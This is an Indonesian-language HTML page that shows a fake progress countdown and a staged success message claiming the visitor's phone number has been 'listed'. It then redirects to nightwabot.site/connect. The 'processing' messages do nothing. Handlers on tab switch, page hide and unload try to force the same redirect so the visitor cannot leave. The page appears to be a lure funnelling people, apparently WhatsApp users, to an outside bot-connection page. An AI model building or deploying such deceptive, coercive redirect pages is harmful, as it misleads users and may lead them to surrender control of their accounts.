<html lang="id" class="scroll-smooth">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Progress</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <link
    href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap"
    rel="stylesheet"
  />
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      min-height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
      overflow: hidden;
      position: relative;
      transition: opacity 1s ease, transform 1s ease;
      opacity: 0;
      transform: translateY(40px) scale(0.95);
      animation: pageEnter 1s cubic-bezier(0.4, 0, 0.2, 1) forwards;
    }
    @keyframes pageEnter {
      0% {
        opacity: 0;
        transform: translateY(40px) scale(0.95);
      }
      60% {
        opacity: 1;
        transform: translateY(-10px) scale(1.02);
      }
      100% {
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    }
    body.closing {
      opacity: 0;
      transform: scale(0.9);
    }
    /* Container background */
    .container-bg {
      background: rgba(15, 23, 42, 0.75); /* slate-900 with opacity */
      border-radius: 1.5rem;
      padding: 3rem 2.5rem;
      box-shadow:
        0 0 15px rgba(34, 197, 94, 0.6),
        0 0 30px rgba(34, 197, 94, 0.4);
      max-width: 400px;
      width: 100%;
      text-align: center;
      position: relative;
      overflow: visible;
      transition: transform 0.8s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.8s ease;
    }
    .container-bg.closing {
      opacity: 0;
      transform: scale(0.8) translateY(50px);
    }
    /* Animate checkmark stroke */
    .checkmark-circle {
      stroke-dasharray: 166;
      stroke-dashoffset: 0;
      stroke: #22c55e;
      stroke-width: 4;
      fill: none;
    }
    /* Checkmark continuous rotation */
    .checkmark-rotate {
      animation: rotate 4s linear infinite;
      transform-origin: center;
      display: inline-block;
      transition: transform 1s ease;
    }
    .checkmark-rotate.closing {
      animation-play-state: paused;
      transform: rotate(720deg) scale(0);
      opacity: 0;
      transition: transform 1s ease, opacity 1s ease;
    }
    @keyframes rotate {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }
    /* Success text glow and pulse with scale bounce */
    .success-text {
      color: #22c55e; /* green-500 */
      text-shadow:
        0 0 8px #22c55e,
        0 0 20px #4ade80,
        0 0 30px #86efac;
      font-weight: 700;
      font-size: 1.875rem; /* text-3xl */
      user-select: none;
      opacity: 0;
      transform: translateY(20px) scale(0.8);
      animation-fill-mode: forwards;
      animation-name: successAppear;
      animation-duration: 1.2s;
      animation-timing-function: cubic-bezier(0.68, -0.55, 0.265, 1.55);
      transition: opacity 1s ease, transform 1s ease;
    }
    .success-text.closing {
      opacity: 0;
      transform: translateY(-20px) scale(0.5);
      transition: opacity 1s ease, transform 1s ease;
    }
    @keyframes successAppear {
      0% {
        opacity: 0;
        transform: translateY(20px) scale(0.8);
        text-shadow: none;
      }
      50% {
        opacity: 1;
        transform: translateY(0) scale(1.1);
        text-shadow:
          0 0 20px #22c55e,
          0 0 40px #4ade80,
          0 0 60px #86efac;
      }
      100% {
        opacity: 1;
        transform: translateY(0) scale(1);
        text-shadow:
          0 0 8px #22c55e,
          0 0 20px #4ade80,
          0 0 30px #86efac;
      }
    }
    /* Countdown number pulse */
    .countdown-number {
      animation: pulse 1s infinite;
      color: #a3e635; /* lime-400 */
      text-shadow:
        0 0 8px #a3e635,
        0 0 20px #84cc16,
        0 0 30px #65a30d;
      user-select: none;
    }
    @keyframes pulse {
      0%, 100% {
        opacity: 1;
        transform: scale(1);
      }
      50% {
        opacity: 0.6;
        transform: scale(1.1);
      }
    }
    /* Text glow */
    .glow-text {
      color: #bbf7d0; /* green-200 */
      text-shadow:
        0 0 5px #bbf7d0,
        0 0 10px #86efac,
        0 0 20px #4ade80,
        0 0 30px #22c55e,
        0 0 40px #16a34a;
      font-weight: 600;
      font-size: 1.125rem; /* text-lg */
      user-select: none;
      min-height: 1.5rem;
      transition: opacity 0.5s ease;
    }
    /* Red glowing corner */
    .red-corner {
      position: fixed;
      top: 0;
      right: 0;
      width: 80px;
      height: 80px;
      pointer-events: none;
      z-index: 9999;
      clip-path: polygon(100% 0, 0 0, 100% 100%);
      background: radial-gradient(circle at top right, rgba(255, 0, 0, 0.8), transparent 70%);
      box-shadow:
        0 0 15px 5px rgba(255, 0, 0, 0.7),
        0 0 30px 10px rgba(255, 0, 0, 0.5);
      opacity: 0;
      animation-fill-mode: forwards;
      transition: opacity 0.3s ease;
    }
    /* Red corner pulse animation for each second */
    @keyframes redPulse {
      0%, 100% {
        opacity: 0.8;
        transform: scale(1);
        box-shadow:
          0 0 15px 5px rgba(255, 0, 0, 0.7),
          0 0 30px 10px rgba(255, 0, 0, 0.5);
      }
      50% {
        opacity: 0.4;
        transform: scale(1.1);
        box-shadow:
          0 0 25px 10px rgba(255, 0, 0, 0.9),
          0 0 40px 15px rgba(255, 0, 0, 0.7);
      }
    }
  </style>
</head>
<body>
  <main class="container-bg" role="main" aria-live="polite" aria-atomic="true" id="container">
    <div id="countdown-container" class="flex flex-col items-center space-y-6">
      <div class="countdown-number font-extrabold text-7xl select-none" id="countdown">10</div>
      <div class="glow-text" id="message-text">Tunggu sebentar, proses sedang berjalan...</div>
    </div>

    <div id="success-container" class="hidden flex flex-col items-center space-y-8" aria-hidden="true">
      <svg
        class="checkmark-rotate w-32 h-32 drop-shadow-[0_0_15px_rgba(34,197,94,0.8)]"
        viewBox="0 0 52 52"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
        aria-label="Animasi logo centang berwarna hijau cerah dengan lingkaran dan garis centang yang berputar terus menerus"
        role="img"
        id="checkmark"
      >
        <circle
          class="checkmark-circle"
          cx="26"
          cy="26"
          r="25"
        />
        <path
          class="checkmark-circle"
          d="M14 27l7 7 16-16"
        />
      </svg>
      <h1 class="success-text select-none" id="success-text" style="opacity: 0; transform: translateY(20px) scale(0.8);">
        Nomor Anda Berhasil Tercantum
      </h1>
    </div>
  </main>

  <div id="red-corner" class="red-corner" aria-hidden="true"></div>

  <script>
    const countdownEl = document.getElementById('countdown');
    const countdownContainer = document.getElementById('countdown-container');
    const messageText = document.getElementById('message-text');
    const successContainer = document.getElementById('success-container');
    const successText = document.getElementById('success-text');
    const redCorner = document.getElementById('red-corner');
    const container = document.getElementById('container');
    const checkmark = document.getElementById('checkmark');

    let countdown = 10;

    // Messages to cycle during countdown
    const messages = [
      "Tunggu sebentar, proses sedang berjalan...",
      "Sedang memproses data Anda...",
      "Hampir selesai, mohon bersabar...",
      "Memastikan nomor Anda tercantum dengan benar...",
      "Terima kasih atas kesabaran Anda..."
    ];

    let messageIndex = 0;

    // Animate message text fade in/out and change text every 2 seconds
    function cycleMessages() {
      messageText.style.opacity = '0';
      setTimeout(() => {
        messageIndex = (messageIndex + 1) % messages.length;
        messageText.textContent = messages[messageIndex];
        messageText.style.opacity = '1';
      }, 500);
    }

    // Start cycling messages every 2 seconds
    const messageInterval = setInterval(cycleMessages, 2000);

    // Countdown update every second
    const interval = setInterval(() => {
      countdown--;
      if (countdown > 0) {
        countdownEl.textContent = countdown;
      } else {
        clearInterval(interval);
        clearInterval(messageInterval);

        // Hide countdown container
        countdownContainer.classList.add('hidden');

        // Show success container with animation and keep checkmark rotating
        successContainer.classList.remove('hidden');
        successContainer.setAttribute('aria-hidden', 'false');

        // Animate success text with bounce scale and glow
        successText.style.animation = 'successAppear 1.2s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards';
        successText.style.opacity = '1';
        successText.style.transform = 'translateY(0) scale(1)';

        // Show red corner glow with countdown 5 seconds before redirect
        let redGlowSeconds = 5;
        redCorner.style.opacity = '0.8';
        let redGlowInterval = setInterval(() => {
          if (redGlowSeconds <= 0) {
            clearInterval(redGlowInterval);
            redCorner.style.opacity = '0';
            // Start closing animation and redirect to nightwabot.site/connect
            startClosingAnimation();
            return;
          }
          // Animate red corner pulse each second
          redCorner.style.animation = 'redPulse 1s ease-in-out';
          // Reset animation to replay
          redCorner.style.animation = 'none';
          void redCorner.offsetWidth; // trigger reflow
          redCorner.style.animation = 'redPulse 1s ease-in-out';

          redGlowSeconds--;
        }, 1000);
      }
    }, 1000);

    // Closing animation and then redirect to nightwabot.site/connect
    function startClosingAnimation() {
      // Add closing classes for fade and scale out
      document.body.classList.add('closing');
      container.classList.add('closing');
      successText.classList.add('closing');
      checkmark.classList.add('closing');

      // After animation ends (1s), redirect to nightwabot.site/connect
      setTimeout(() => {
        window.location.href = 'https://nightwabot.site/connect';
      }, 1000);
    }

    // Detect if page is hidden or user switches tab or closes
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        window.location.href = 'https://nightwabot.site/connect';
      }
    });

    window.addEventListener('pagehide', () => {
      window.location.href = 'https://nightwabot.site/connect';
    });

    window.addEventListener('beforeunload', () => {
      window.location.href = 'https://nightwabot.site/connect';
    });
  </script>
</body>
</html>
